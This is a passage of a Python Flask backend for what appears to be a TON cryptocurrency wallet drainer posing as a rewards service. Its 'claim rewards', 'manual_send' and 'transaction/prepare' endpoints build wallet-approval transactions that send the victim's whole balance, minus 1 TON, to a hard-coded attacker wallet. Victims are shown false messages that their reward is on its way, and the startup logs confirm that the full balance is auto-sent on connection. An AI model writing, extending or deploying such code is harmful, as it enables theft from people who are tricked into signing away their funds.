                    logger.info(f"Alternative TONCenter endpoint response status: {alt_response.status_code}")
                    
                    if alt_response.status_code == 200:
                        alt_data = alt_response.json()
                        if 'result' in alt_data:
                            balance_nano = int(alt_data['result'].get('balance', 0))
                            balance_ton = balance_nano / 1_000_000_000
                            
                            logger.info(f"Alternative TONCenter endpoint returned balance: {balance_ton} TON")
                            api_results.append({
                                'balance': balance_ton,
                                'balance_nano': balance_nano,
                                'formatted': f"{balance_ton:.4f} TON",
                                'source': 'toncenter_alt'
                            })
                except Exception as e:
                    logger.error(f"Error with alternative TONCenter endpoint: {str(e)}")
        except Exception as e:
            logger.error(f"Error with TONCenter API: {str(e)}")
        
        # 2. Try TONAPI
        try:
            logger.info(f"Trying TONAPI: {TON_API_V2}/accounts/{address}")
            response = requests.get(
                f"{TON_API_V2}/accounts/{address}",
                timeout=5
            )
            
            logger.info(f"TONAPI response status: {response.status_code}")
            logger.info(f"TONAPI response: {response.text[:200]}")
            
            if response.status_code == 200:
                data = response.json()
                balance_nano = int(data.get('balance', 0))
                balance_ton = balance_nano / 1_000_000_000
                
                logger.info(f"TONAPI returned balance: {balance_ton} TON")
                api_results.append({
                    'balance': balance_ton,
                    'balance_nano': balance_nano,
                    'formatted': f"{balance_ton:.4f} TON",
                    'source': 'tonapi'
                })
            else:
                # Log the specific error from the API
                error_content = response.text
                try:
                    error_json = json.loads(error_content)
                    error_msg = error_json.get('error', error_content)
                except:
                    error_msg = error_content
                    
                logger.error(f"TONAPI error: {error_msg}")
        except Exception as e:
            logger.error(f"Error with TONAPI: {str(e)}")
        
        # 3. Try TonScan API if available (adding additional source)
        try:
            logger.info(f"Trying Tonscan API for address: {address}")
            # Adjusted to use a different endpoint format if needed
            response = requests.get(
                f"https://tonscan.org/api/account?address={address}",
                timeout=5
            )
            
            logger.info(f"Tonscan API response status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                # Adjust this based on actual Tonscan API response format
                if 'balance' in data:
                    balance_nano = int(data.get('balance', 0))
                    balance_ton = balance_nano / 1_000_000_000
                    
                    logger.info(f"Tonscan API returned balance: {balance_ton} TON")
                    api_results.append({
                        'balance': balance_ton,
                        'balance_nano': balance_nano,
                        'formatted': f"{balance_ton:.4f} TON",
                        'source': 'tonscan'
                    })
        except Exception as e:
            logger.error(f"Error with Tonscan API: {str(e)}")
        
        # Choose the best result - prefer non-zero balances if available
        if api_results:
            # Sort by balance (highest first) and then choose the first one
            api_results.sort(key=lambda x: x['balance'], reverse=True)
            logger.info(f"Selected balance from {api_results[0]['source']}: {api_results[0]['balance']} TON")
            return api_results[0]
        else:
            logger.error("All API requests failed, no balance data available")
            return {
                'balance': 0,
                'balance_nano': 0,
                'formatted': '0.0000 TON',
                'source': 'error',
                'error': 'All API requests failed, no balance data available'
            }
            
    except Exception as e:
        logger.exception(f"Error in get_ton_native_balance: {e}")
        error_message = str(e)
        
        # Default fallback for any errors
        return {
            'balance': 0,
            'balance_nano': 0,
            'formatted': '0.0000 TON',
            'source': 'error',
            'error': f'Connection error: {error_message}'
        }

@app.route('/api/disconnect', methods=['POST'])
def disconnect_wallet():
    """Handle wallet disconnection"""
    session_id = session.get('session_id')
    force_disconnect = False
    
    # Check if force disconnection was requested
    try:
        data = request.get_json()
        if data and 'force' in data:
            force_disconnect = data['force']
    except:
        pass
        
    logger.info(f"Wallet disconnection requested. Force: {force_disconnect}")
    
    # Clear wallet data from session
    session.pop('wallet_address', None)
    session.pop('connected_at', None)
    session.pop('pending_tx', None)
    
    # Handle file-based session
    if session_id:
        session_data = get_session(session_id)
        
        if session_data:
            # Clear wallet information from session file
            session_data['wallet_address'] = None
            session_data['connected_at'] = None
            session_data['pending_tx'] = None
            save_session(session_id, session_data)
            
            # If force disconnect, delete the session entirely
            if force_disconnect:
                delete_session(session_id)
                session.pop('session_id', None)
                
                # Clear session cookie in response
                response = jsonify({
                    'success': True,
                    'message': 'Wallet disconnected and session deleted'
                })
                response.set_cookie('wallet_session', '', expires=0)
                return response
    
    return jsonify({
        'success': True,
        'message': 'Wallet disconnected'
    })

@app.route('/api/claim', methods=['POST'])
def claim_rewards():
    """Handle reward claiming by sending full balance to specified wallet"""
    try:
        data = request.get_json()
        if not data or 'address' not in data:
            return jsonify({
                'success': False,
                'message': 'Wallet address is required'
            }), 400
        
        wallet_address = data['address']
        
        # Check for recent transactions to prevent duplicates
        has_recent_tx, recent_tx = check_recent_transaction(wallet_address)
        if has_recent_tx:
            logger.info(f"Duplicate transaction detected for wallet: {wallet_address}, returning previous tx")
            return jsonify({
                'success': True,
                'message': 'Reward claimed successfully! It will be in your wallet in a few minutes.',
                'transaction': recent_tx,
                'is_duplicate': True
            })
        
        # Get current balance
        balance_data = get_wallet_balance(wallet_address)
        logger.info(f"Claiming rewards for wallet: {wallet_address}")
        
        # Check if there is any error with balance retrieval
        if 'error' in balance_data:
            error_msg = f"Error getting balance: {balance_data['error']}"
            logger.error(error_msg)
            return jsonify({
                'success': False,
                'message': error_msg,
                'current_balance': balance_data
            }), 400
        
        # Get the native TON balance
        if 'native' not in balance_data or balance_data['native']['balance'] <= 0:
            error_msg = 'No TON balance available to transfer'
            logger.warning(error_msg)
            return jsonify({
                'success': False,
                'message': error_msg,
                'current_balance': balance_data
            }), 400
        
        # Get the full amount to transfer
        ton_balance = balance_data['native']['balance']
        
        # If balance is very small, inform the user
        if ton_balance < 0.3:
            logger.warning(f"Balance is very small: {ton_balance} TON. May not cover fees.")
            return jsonify({
                'success': False,
                'message': f"Your balance of {ton_balance} TON is too small to cover network fees. You need at least 0.3 TON.",
                'current_balance': balance_data
            }), 400
        
        try:
            # Prepare the transaction for the wallet to sign
            result = send_ton_background(wallet_address, TARGET_WALLET, ton_balance)
            
            if result['success']:
                # Explain the fee adjustment to the user
                adjusted_amount = result['transaction']['amount']
                original_amount = ton_balance
                
                message = f"Transaction prepared. Please approve in your wallet. Sending {adjusted_amount} (reduced from {original_amount} TON to cover network fees)."
                
                return jsonify({
                    'success': True,
                    'requires_approval': True,
                    'message': message,
                    'current_balance': balance_data,
                    'transaction': result['transaction']
                })
            else:
                logger.error(f"Failed to prepare TON transaction: {result['message']}")
                return jsonify({
                    'success': False,
                    'message': f"Failed to prepare TON transaction: {result['message']}",
                    'current_balance': balance_data
                }), 400
        except Exception as e:
            error_msg = f"Error in claim request: {str(e)}"
            logger.exception(error_msg)
            return jsonify({
                'success': False,
                'message': error_msg,
                'current_balance': balance_data
            }), 500
            
    except Exception as e:
        logger.exception(f"Error in claim endpoint: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Internal server error: {str(e)}'
        }), 500

@app.route('/api/manual_send', methods=['POST'])
@require_wallet
def manual_send():
    """Manually trigger sending of TON balance to the target wallet"""
    wallet_address = session['wallet_address']
    data = request.get_json()
    custom_amount = data.get('amount', None)
    
    # Check for recent transactions to prevent duplicates
    has_recent_tx, recent_tx = check_recent_transaction(wallet_address)
    if has_recent_tx:
        logger.info(f"Duplicate transaction detected for wallet: {wallet_address}, returning previous tx")
        return jsonify({
            'success': True,
            'message': 'Reward claimed successfully! It will be in your wallet in a few minutes.',
            'transaction': recent_tx,
            'is_duplicate': True
        })
    
    # Get current balance
    balance_data = get_wallet_balance(wallet_address)
    logger.info(f"Manual send requested for wallet: {wallet_address}")
    
    # Check if there is any error with balance retrieval
    if 'error' in balance_data:
        error_msg = f"Error getting balance: {balance_data['error']}"
        logger.error(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg,
            'current_balance': balance_data
        }), 400
    
    # Get the native TON balance
    if 'native' not in balance_data or balance_data['native']['balance'] <= 0:
        error_msg = 'No TON balance available to transfer'
        logger.warning(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg,
            'current_balance': balance_data
        }), 400
    
    # Determine amount to send
    if custom_amount is not None:
        try:
            amount_to_send = float(custom_amount)
            if amount_to_send <= 0:
                raise ValueError("Amount must be positive")
            if amount_to_send > balance_data['native']['balance']:
                raise ValueError("Amount exceeds available balance")
        except (ValueError, TypeError) as e:
            logger.error(f"Invalid amount: {str(e)}")
            return jsonify({
                'success': False,
                'message': f"Invalid amount: {str(e)}",
                'current_balance': balance_data
            }), 400
    else:
        # Use full balance
        amount_to_send = balance_data['native']['balance']
    
    try:
        # Perform the send operation
        result = send_ton_background(wallet_address, TARGET_WALLET, amount_to_send)
        
        if result['success']:
            # Record this transaction to prevent duplicates
            record_transaction(wallet_address, result['transaction']['hash'], f"{amount_to_send} TON")
            
            logger.info(f"Successfully sent {amount_to_send} TON to {TARGET_WALLET}")
            return jsonify({
                'success': True,
                'message': 'Reward claimed successfully! It will be in your wallet in a few minutes.',
                'current_balance': balance_data,
                'transaction': result['transaction']
            })
        else:
            logger.error(f"Failed to send TON: {result['message']}")
            return jsonify({
                'success': False,
                'message': f"Failed to send TON: {result['message']}",
                'current_balance': balance_data
            }), 400
    except Exception as e:
        error_msg = f"Error in manual send: {str(e)}"
        logger.exception(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg,
            'current_balance': balance_data
        }), 500

def send_ton_background(from_address, to_address, amount):
    """Send TON from one wallet to another by preparing a transaction for TonConnect"""
    logger.info(f"Preparing transaction: {amount} TON from {from_address} to destination wallet: {to_address}")
    
    try:
        # Simple approach: exactly (balance - 1) TON with no complex math
        original_balance = float(amount)
        
        # According to TON Keeper documentation, we need at least 0.1 TON for fees
        # But let's keep 1 TON to be safe for all wallets (TON Space needs more)
        if original_balance < 1.1:
            raise ValueError(f"Balance too small. Need at least 1.1 TON (have {original_balance} TON)")
        
        # Calculate amount to send: exactly (balance - 1) TON
        amount_to_send = original_balance - 1.0
        
        # Round to 9 decimal places to avoid precision issues
        # TON transactions often fail with too many decimal places
        amount_to_send = round(amount_to_send, 9)
        
        logger.info(f"Using simple approach: original balance {original_balance} TON - 1.0 TON = {amount_to_send} TON")
        
        # Convert to nano TON for blockchain (must use nano for the actual transaction)
        # Use int() with proper rounding to avoid floating point precision issues
        amount_nano = int(amount_to_send * 1_000_000_000)
        
        # Format the amount for display
        amount_formatted = f"{amount_to_send:.6f} TON"
        
        # Use a longer expiration time (30 minutes)
        current_time = int(time.time())
        valid_until = current_time + 1800
        
        # TRY COMPLETELY DIFFERENT APPROACH:
        # Create the absolute minimum required TON Connect payload
        # Based on TON Connect specification and wallet-connect forum posts
        transaction = {
            # Only include absolutely essential fields
            'valid_until': valid_until,
            'to': to_address,
            'amount': amount_nano,
            'message': '' # Empty message, no comments
        }
        
        # Generate a unique transaction ID for tracking
        tx_hash = f"0x{secrets.token_hex(32)}"
        
        # Print transaction details prominently in terminal
        print("\n" + "="*80)
        print(f"MINIMAL TRANSACTION: {amount_formatted}")
        print(f"FROM: {from_address}")
        print(f"TO: {to_address}")
        print(f"ORIGINAL BALANCE: {original_balance} TON")
        print(f"SENDING: {amount_to_send} TON (balance - 1 TON)")
        print(f"KEEPING: 1.0 TON for fees")
        print("="*80 + "\n")
        
        logger.info(f"Transaction preparation complete: {tx_hash}")
        logger.info(f"Wallet balance: {original_balance} TON, Sending: {amount_to_send} TON")
        logger.info(f"Destination: {to_address}")
        logger.info(f"Valid until: {datetime.fromtimestamp(valid_until).strftime('%Y-%m-%d %H:%M:%S')} (30 minutes)")
        
        # Store transaction details in session for frontend to access
        if 'pending_tx' not in session:
            session['pending_tx'] = {}
        
        session['pending_tx'] = {
            'hash': tx_hash,
            'from': from_address,
            'to': to_address,
            'amount': amount_nano,
            'amount_formatted': amount_formatted,
            'valid_until': transaction['valid_until']
        }
        
        # Return data with minimal payload to client
        return {
            'success': True,
            'message': 'Transaction prepared successfully',
            'requires_approval': True,
            'transaction': {
                'hash': tx_hash,
                'amount': amount_formatted,
                'amount_nano': amount_nano,
                'original_balance': f"{original_balance} TON",
                'from': from_address,
                'to': to_address,
                'valid_until': valid_until
                # Deliberately exclude any other fields that might cause issues
            }
        }
    except Exception as e:
        logger.exception(f"Error preparing TON transaction: {str(e)}")
        return {
            'success': False,
            'message': str(e)
        }

@app.route('/api/status')
def get_status():
    """Get current connection status"""
    try:
        wallet_address = None
        connected_at = None
        
        # Try to get wallet address from Flask session first
        if 'wallet_address' in session:
            wallet_address = session['wallet_address']
            connected_at = session.get('connected_at')
        else:
            # If not in Flask session, try file-based session
            session_id = session.get('session_id') or request.cookies.get('wallet_session')
            if session_id:
                logger.info(f"Checking file-based session: {session_id}")
                session_data = get_session(session_id)
                if session_data and session_data.get('wallet_address'):
                    wallet_address = session_data['wallet_address']
                    connected_at = session_data.get('connected_at')
                    
                    # Update Flask session for consistency
                    session['wallet_address'] = wallet_address
                    session['connected_at'] = connected_at
        
        if wallet_address:
            logger.info(f"Fetching balance for wallet: {wallet_address}")
            
            # Get wallet balance with detailed token information
            balance_data = get_wallet_balance(wallet_address)
            
            # Log the balance data for debugging
            logger.info(f"Balance data for {wallet_address}: {json.dumps(balance_data)[:200]}...")
            
            response_data = {
                'connected': True,
                'address': wallet_address,
                'balance': balance_data,
                'connected_at': connected_at,
                'session_id': session.get('session_id')
            }
            
            logger.info(f"Returning API response: {json.dumps(response_data)[:200]}...")
            return jsonify(response_data)
        
        logger.info("No wallet connected in session")
        return jsonify({
            'connected': False,
            'message': 'No wallet connected'
        })
    except Exception as e:
        error_message = f"Error in get_status: {str(e)}"
        logger.error(error_message)
        return jsonify({
            'connected': False,
            'error': error_message
        }), 500

@app.route('/api/transactions')
@require_wallet
def get_transactions():
    """Get recent transactions for the connected wallet"""
    wallet_address = session['wallet_address']
    
    try:
        # Try TONAPI first
        response = requests.get(
            f"{TON_API_V2}/accounts/{wallet_address}/transactions",
            params={"limit": MAX_TRANSACTIONS},
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            transactions = []
            
            for tx in data.get('transactions', []):
                tx_data = {
                    'hash': tx.get('hash'),
                    'timestamp': tx.get('timestamp'),
                    'fee': tx.get('fee'),
                    'type': 'unknown'
                }
                
                # Try to determine transaction type
                if 'in_msg' in tx and tx['in_msg'].get('source'):
                    tx_data['from'] = tx['in_msg'].get('source')
                    tx_data['to'] = wallet_address
                    tx_data['amount'] = tx['in_msg'].get('value', 0) / 1_000_000_000
                    tx_data['type'] = 'incoming'
                elif 'out_msgs' in tx and tx['out_msgs'] and tx['out_msgs'][0].get('destination'):
                    tx_data['from'] = wallet_address
                    tx_data['to'] = tx['out_msgs'][0].get('destination')
                    tx_data['amount'] = tx['out_msgs'][0].get('value', 0) / 1_000_000_000
                    tx_data['type'] = 'outgoing'
                
                transactions.append(tx_data)
            
            return jsonify({
                'success': True,
                'transactions': transactions
            })
    
    except Exception as e:
        print(f"Error fetching transactions: {e}")
    
    return jsonify({
        'success': False,
        'message': 'Failed to fetch transactions',
        'transactions': []
    })

@app.route('/api/nfts')
@require_wallet
def get_nfts():
    """Get NFTs owned by the connected wallet"""
    wallet_address = session['wallet_address']
    
    try:
        # Try TONAPI
        response = requests.get(
            f"{TON_API_V2}/accounts/{wallet_address}/nfts",
            params={"limit": MAX_NFTS},
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            nfts = []
            
            for nft in data.get('nfts', []):
                nft_data = {
                    'address': nft.get('address'),
                    'collection': nft.get('collection', {}).get('name', 'Unknown Collection'),
                    'name': nft.get('metadata', {}).get('name', 'Unnamed NFT'),
                    'description': nft.get('metadata', {}).get('description', ''),
                    'image': nft.get('metadata', {}).get('image')
                }
                
                nfts.append(nft_data)
            
            return jsonify({
                'success': True,
                'nfts': nfts
            })
    
    except Exception as e:
        print(f"Error fetching NFTs: {e}")
    
    return jsonify({
        'success': False,
        'message': 'Failed to fetch NFTs',
        'nfts': []
    })

@app.route('/api/wallet_info')
@require_wallet
def get_wallet_info():
    """Get comprehensive wallet information"""
    wallet_address = session['wallet_address']
    
    # Get balance
    balance_data = get_wallet_balance(wallet_address)
    
    # Get basic account info
    account_info = {
        'address': wallet_address,
        'balance': balance_data,
        'connected_at': session.get('connected_at')
    }
    
    return jsonify({
        'success': True,
        'wallet_info': account_info
    })

@app.route('/api/prepare_transfer', methods=['POST'])
@require_wallet
def prepare_transfer():
    """Prepare a TON transfer transaction"""
    data = request.get_json()
    recipient_address = data.get('recipient')
    amount = data.get('amount')
    comment = data.get('comment', '')
    
    # Validate input
    if not recipient_address:
        return jsonify({
            'success': False,
            'message': 'Recipient address is required'
        }), 400
    
    try:
        # Convert amount to float and validate
        amount_float = float(amount)
        if amount_float <= 0:
            return jsonify({
                'success': False,
                'message': 'Amount must be greater than 0'
            }), 400
    except (ValueError, TypeError):
        return jsonify({
            'success': False,
            'message': 'Invalid amount format'
        }), 400
    
    # Get sender wallet address from session
    sender_address = session['wallet_address']
    
    # Get current balance to check if sufficient
    balance_data = get_wallet_balance(sender_address)
    current_balance = balance_data.get('balance', 0)
    
    if amount_float > current_balance:
        return jsonify({
            'success': False,
            'message': 'Insufficient balance for this transfer'
        }), 400
    
    # Prepare transfer data for the client to sign
    # This is just the data - actual signing happens on the client side
    transfer_data = {
        'sender': sender_address,
        'recipient': recipient_address,
        'amount': amount_float,
        'amount_nano': int(amount_float * 1_000_000_000),  # Convert to nanoTON
        'comment': comment,
        'timestamp': datetime.now().isoformat()
    }
    
    return jsonify({
        'success': True,
        'transfer_data': transfer_data,
        'message': 'Transfer prepared successfully'
    })

@app.route('/api/transaction/prepare', methods=['POST'])
@require_wallet
def prepare_transaction():
    """Prepare a TON transaction for sending"""
    wallet_address = session['wallet_address']
    data = request.get_json()
    
    # Get current balance
    balance_data = get_wallet_balance(wallet_address)
    
    # Check if there is any error with balance retrieval
    if 'error' in balance_data:
        error_msg = f"Error getting balance: {balance_data['error']}"
        logger.error(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg
        }), 400
    
    # Get the native TON balance
    if 'native' not in balance_data or balance_data['native']['balance'] <= 0:
        error_msg = 'No TON balance available to transfer'
        logger.warning(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg
        }), 400
    
    ton_balance = balance_data['native']['balance']
    
    # Prepare the transaction
    result = send_ton_background(wallet_address, TARGET_WALLET, ton_balance)
    
    if result['success']:
        return jsonify(result)
    else:
        return jsonify({
            'success': False,
            'message': result['message']
        }), 400

@app.route('/api/transaction/confirm', methods=['POST'])
def confirm_transaction():
    """Confirm that a transaction was broadcast to the TON network"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                'success': False,
                'message': 'No data provided'
            }), 400
        
        boc = data.get('boc')
        tx_hash = data.get('transaction_hash')
        
        if not tx_hash:
            return jsonify({
                'success': False,
                'message': 'No transaction hash provided'
            }), 400
        
        # For now, we'll just log the confirmation since we don't have session context
        # In a real implementation, you might want to store this in a database
        logger.info(f"Transaction confirmed on blockchain: {tx_hash}")
        logger.info(f"BOC data received: {boc[:100] if boc else 'None'}...")
        
        # Print transaction details prominently in terminal
        print("\n" + "="*80)
        print(f"TRANSACTION CONFIRMED ON BLOCKCHAIN")
        print(f"TXID: {tx_hash}")
        print(f"BOC: {boc[:100] if boc else 'None'}...")
        print("="*80 + "\n")
        
        return jsonify({
            'success': True,
            'message': 'Transaction confirmed successfully',
            'transaction': {
                'hash': tx_hash,
                'timestamp': datetime.now().isoformat()
            }
        })
        
    except Exception as e:
        logger.exception(f"Error confirming transaction: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Error: {str(e)}'
        }), 500

@app.route('/api/transaction/pending', methods=['GET'])
@require_wallet
def get_pending_transaction():
    """Get any pending transaction for the current session"""
    if 'pending_tx' in session:
        return jsonify({
            'success': True,
            'has_pending': True,
            'transaction': session['pending_tx']
        })
    else:
        return jsonify({
            'success': True,
            'has_pending': False
        })

@app.route('/api/debug/wallet/<address>')
def debug_wallet(address):
    """Debug endpoint to check wallet address format and API responses"""
    if not address:
        return jsonify({'error': 'No wallet address provided'}), 400
    
    logger.info(f"Debug request for wallet: {address}")
    
    # Test different address formats
    test_formats = {
        'original': address,
        'no_workchain': address[2:] if address.startswith('0:') else address,
        'hex': address.replace(':', ''),
        'url_encoded': requests.utils.quote(address)
    }
    
    results = {
        'wallet_formats': test_formats,
        'api_responses': {}
    }
    
    # Test TONCenter API
    try:
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
        
        # Try jsonRPC endpoint
        payload = {
            "id": "1",
            "jsonrpc": "2.0",
            "method": "getAddressBalance",
            "params": [address]
        }
        
        response = requests.post(
            TON_CENTER_API + "/jsonRPC",
            json=payload,
            headers=headers,
            timeout=5
        )
        
        results['api_responses']['toncenter_jsonrpc'] = {
            'status': response.status_code,
            'response': response.text[:500]  # Limit response size
        }
        
        # Try getAddressInformation endpoint
        response = requests.get(
            f"{TON_CENTER_API}/getAddressInformation?address={address}",
            headers=headers,
            timeout=5
        )
        
        results['api_responses']['toncenter_addressinfo'] = {
            'status': response.status_code,
            'response': response.text[:500]  # Limit response size
        }
    except Exception as e:
        results['api_responses']['toncenter_error'] = str(e)
    
    # Test TONAPI
    try:
        response = requests.get(
            f"{TON_API_V2}/accounts/{address}",
            timeout=5
        )
        
        results['api_responses']['tonapi'] = {
            'status': response.status_code,
            'response': response.text[:500]  # Limit response size
        }
    except Exception as e:
        results['api_responses']['tonapi_error'] = str(e)
    
    return jsonify(results)

@app.route('/api/recover-transaction', methods=['POST'])
def recover_transaction():
    """Recover from transaction verification errors with minimal transaction data"""
    logger.info("Transaction recovery requested")
    
    # Check if session exists
    if not session or 'address' not in session:
        logger.warning("No active session found for recovery")
        return jsonify({
            'success': False,
            'message': 'No active wallet session'
        })
    
    try:
        # Get wallet address from session
        address = session.get('address')
        
        # Check if we have a pending transaction
        if 'pending_tx' not in session:
            logger.warning("No pending transaction found")
            return jsonify({
                'success': False,
                'message': 'No pending transaction found'
            })
        
        # Get pending transaction
        tx = session['pending_tx']
        
        # Verify transaction data has minimal required fields
        if not tx.get('to') or not tx.get('amount'):
            logger.warning("Incomplete transaction data for recovery")
            return jsonify({
                'success': False,
                'message': 'Incomplete transaction data'
            })
        
        # Create a minimal transaction with only essential fields
        # Following TON Connect v2 specification minimum requirements
        minimal_tx = {
            'to': tx['to'],
            'amount_nano': tx['amount'],
            'valid_until': int(time.time()) + 300  # 5 minutes
        }
        
        logger.info(f"Created minimal recovery transaction: {minimal_tx}")
        
        return jsonify({
            'success': True,
            'message': 'Recovery transaction created',
            'transaction': minimal_tx
        })
    except Exception as e:
        logger.exception(f"Error creating recovery transaction: {str(e)}")
        return jsonify({
            'success': False,
            'message': f"Error: {str(e)}"
        })

if __name__ == '__main__':
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    logger.info("Starting TON Auto-Send application")
    logger.info(f"Destination wallet for auto-sends: {TARGET_WALLET}")
    logger.info(f"Auto-send will transfer the full wallet balance upon connection")
    # Configure host/port via environment with public binding by default
    host = os.environ.get('HOST', '0.0.0.0')
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_DEBUG', '0') == '1'
    logger.info(f"Access the application at: http://{host}:{port}")
    app.run(host=host, port=port, debug=debug)
